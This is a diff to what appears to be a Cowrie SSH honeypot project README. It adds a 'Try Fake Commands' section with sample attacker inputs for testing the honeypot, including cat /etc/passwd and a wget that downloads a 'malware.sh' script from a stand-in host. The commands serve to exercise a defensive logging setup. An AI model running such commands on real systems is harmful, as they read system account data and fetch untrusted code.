@@ -35,3 +35,10 @@ By deploying a **Cowrie SSH honeypot**, I was able to capture attacker behavior,
 ### SSH Test
 ```bash
 ssh root@<Honeypot_Public_IP> -p 2222
+
+## Try Fake Commands
+ls
+cat /etc/passwd
+wget http://example.com/malware.sh
+
+
